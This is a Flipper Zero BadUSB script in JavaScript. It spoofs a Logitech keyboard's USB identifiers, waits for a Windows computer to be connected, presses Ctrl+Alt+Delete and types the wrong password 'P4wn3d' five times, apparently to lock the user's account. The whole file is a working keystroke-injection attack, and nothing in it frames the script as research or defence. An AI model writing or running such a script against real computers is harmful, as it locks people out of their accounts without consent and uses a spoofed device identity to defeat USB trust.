let badusb = require("badusb");
let layout = "fr-FR";
let tryBeforeLockAccount = 5;
let passwordtry = "P4wn3d";

// configure the keyboard to connect
badusb.setup({ vid: 0x046d, pid: 0xc33f, mfr_name: "Logitech, Inc", prod_name: "Keyboard", layout_path: "/ext/badusb/assets/layouts/" + layout + ".kl" });

print("Waiting for connection to computer");
while (!badusb.isConnected()) {
    delay(500);
}

// for windows: unlock the visibility of password field
print("Unsleep computer...");
badusb.press("CTRL","ALT","DELETE");
delay(200);
// send key to computer
print("Send ", tryBeforeLockAccount," wrong password...");

for (let i = 0; i < tryBeforeLockAccount; i++) {
		print("Try number ", i+1);
	badusb.print(passwordtry);
	badusb.press("ENTER");
	delay(1000);
	badusb.press("ENTER");
	delay(500);	
}

// End
delay(100);
badusb.quit();
print("Commands send to computer");